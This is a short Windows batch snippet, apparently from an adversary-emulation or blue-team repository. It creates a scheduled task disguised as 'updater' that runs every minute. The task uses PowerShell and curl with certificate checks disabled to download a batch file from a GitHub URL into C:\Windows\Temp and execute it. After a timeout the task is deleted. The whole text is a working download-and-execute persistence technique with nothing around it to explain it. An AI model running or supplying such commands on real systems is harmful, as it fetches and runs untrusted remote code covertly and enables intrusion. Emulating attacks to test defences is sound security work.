schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -c 'curl.exe -kL https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/vmchecker.bat -o C:\Windows\Temp\test.bat'; C:\Windows\Temp\test.bat; schtasks /DELETE /TN updater /F"

timeout /t 240

schtasks /DELETE /TN updater /F







